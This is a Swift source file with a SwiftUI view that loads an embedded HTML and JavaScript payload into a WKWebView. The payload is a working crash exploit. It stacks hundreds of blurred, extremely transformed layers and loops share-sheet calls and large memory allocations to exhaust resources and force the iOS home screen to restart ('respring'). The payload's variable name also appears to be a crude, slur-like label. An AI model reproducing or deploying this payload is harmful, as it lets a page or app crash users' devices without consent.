import SwiftUI
import WebKit

@MainActor
final class RespringController: ObservableObject {
    @Published var active = false
    func respring() { active = true }
}

private let nigaRespringHTML = """
<html><body><iframe id='f' sandbox='allow-scripts allow-modals allow-forms allow-popups allow-presentation'></iframe><script>
const f=document.getElementById('f');
f.srcdoc=`<html><body><script>
const c=document.createElement('div');c.style='perspective:1px;perspective-origin:9999999% 9999999%';document.body.appendChild(c);
for(let i=0;i<500;i++){let d=document.createElement('div');d.style='position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg)';c.appendChild(d)}
setInterval(()=>{navigator.share({title:'R',text:'R'.repeat(100000)}).catch(()=>{});let x=new Uint8Array(10485760);crypto.getRandomValues(x)},0);
<\/script></body></html>`;
</script></body></html>
"""

struct RespringView: UIViewRepresentable {
    func makeUIView(context: Context) -> WKWebView { WKWebView() }
    func updateUIView(_ webView: WKWebView, context: Context) { webView.loadHTMLString(nigaRespringHTML, baseURL: nil) }
}
